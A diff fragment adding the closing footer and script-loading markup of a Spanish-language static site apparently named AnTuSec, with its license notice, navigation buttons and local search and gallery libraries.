+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/es/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.es.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/es/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
